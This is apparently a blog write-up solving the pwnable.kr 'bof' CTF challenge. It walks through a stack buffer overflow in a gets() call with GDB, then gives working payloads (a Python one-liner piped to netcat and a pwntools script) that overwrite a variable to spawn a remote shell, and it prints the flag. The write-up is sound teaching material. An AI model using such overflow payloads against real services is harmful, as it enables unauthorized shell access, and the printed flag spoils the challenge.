---
title: Pwnable CTF - bof
tags:
  - pwnable
  - ctf
date: 2024-01-04
---

In this challenge, there's no shell. Instead we download some files and use
[netcat] to connect to a remote host running what is presumably the `bof`
binary. We will likely have to employ a [buffer overflow] to capture the flag.

```
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

Let's take a look at `bof`:
```sh
$ file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

Running `bof` locally, we get a prompt and a hint: "overflow me". Entering a random string
results in "Nah...".
```sh
$ nc pwnable.kr 9000
overflow me :
hello
Nah..
```

Let's take a look at the source code provided:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

This program passes `0xdeadbeef` to `func()` as `key`. A buffer is created with
a length of 32. `[gets]` is used to read a string from *stdin* into
`overflowme`. Finally, `key` is compared to `0xcafebabe` and if they are equal,
we are given a shell.

From the man page for `gets()`:

    **gets()** reads a line from *stdin* into the buffer pointed to by *s* until either a terminating newline or **EOF**,
    which it replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below)."

So now we know that `gets` will happily read more bytes than the buffer will
hold. We need to somehow overwrite `key` with the value `0xcafebabe`.

Let's open the binary in [GDB]:
```sh
gdb ./bof
```

If we disassembly `func`, we can see the compare against `0xcafebabe` at `+40`.
```
(gdb) disas func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
   0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7df6880 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7df5ee0 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7dcbcd0 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7df6880 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7eb4e40 <__stack_chk_fail>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret
```

Let's set a breakpoint there:
```
(gdb) break *func+40
Breakpoint 1 at 0x56555654
```

Let run it. We know the buffer expects 32 bytes, so lets give it some sentinel
values to find them on the stack.
```
(gdb) run
overflow me :
aaaabbbbccccddddeeeeffffgggghhhh

Breakpoint 1, 0x56555654 in func ()
```

We hit out breakpoints. Let examine the stack:
```
(gdb) x/24x $esp
0xffffd290:     0xffffd2ac      0x00000020      0x00000000      0xffffd454
0xffffd2a0:     0x00000000      0x00000000      0x01000000      0x61616161
0xffffd2b0:     0x62626262      0x63636363      0x64646464      0x65656565
0xffffd2c0:     0x66666666      0x67676767      0x68686868      0x62f5e700
0xffffd2d0:     0xffffd310      0xf7fbe66c      0xffffd2f8      0x5655569f
0xffffd2e0:     0xdeadbeef      0x00000000      0xf7faa000      0xf7ea283b
```

We can see our input (`0x61..0x68`) starting at `0xffffd2ac` and ending at
`0xffffd2c8`. So we need to overflow the buffer until it overwrites `0xdeadbeef`
at `0xffffd2e0`. That's 52 bytes past the start of our input, or 13 double words
(chunks of 4 bytes). So we need 52 bytes of filler and the value we want to
overwrite, `0xcafebabe`.

To generate the bytes we need, we can use Python. Note that we need reverse the
order of the bytes in `0xcafebabe` to `0xbebafeca` because x86 is [little
endian]. We need to use `sys.stdout.buffer.write` instead of `print` because we
need the raw bytes output and not have it interpreted as UTF-8.

```sh
$ python -c "import sys; sys.stdout.buffer.write(b'\xbe\xba\xfe\xca'*14)" | hexdump -v
0000000 babe cafe babe cafe babe cafe babe cafe
0000010 babe cafe babe cafe babe cafe babe cafe
0000020 babe cafe babe cafe babe cafe babe cafe
0000030 babe cafe babe cafe
```

Let's try our payload against our target. We need to wrap Python program in sub
shell with `cat` in order to keep stdin open. Nothing will be printed at first,
but if hit return once, we'll be in the shell and can execute `ls` to see what
we have access to and finally `cat flag` to get out flag value.
```sh
$ (python -c "import sys; sys.stdout.buffer.write(b'\xbe\xba\xfe\xca'*14)"; cat) | nc pwnable.kr 9000

ls
bof
bof.c
flag
log
super.pl
cat flag
daddy, I just pwned a buFFer :)
```

In the future, we can use [pwntools] to make our attack easier to write an execute:
```py
from pwn import *

payload = p32(0xcafebabe)*14
conn = remote("pwnable.kr", 9000)
conn.sendline(payload)
conn.interactive()
```

```sh
$ python bof.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
```

[buffer overflow]: https://en.wikipedia.org/wiki/Buffer_overflow
[netcat]: https://en.wikipedia.org/wiki/Netcat
[`gets`]: https://linux.die.net/man/3/gets
[GDB]: https://en.wikipedia.org/wiki/GNU_Debugger
[little endian]: https://en.wikipedia.org/wiki/Endianness
[pwntools]: https://docs.pwntools.com/en/latest/
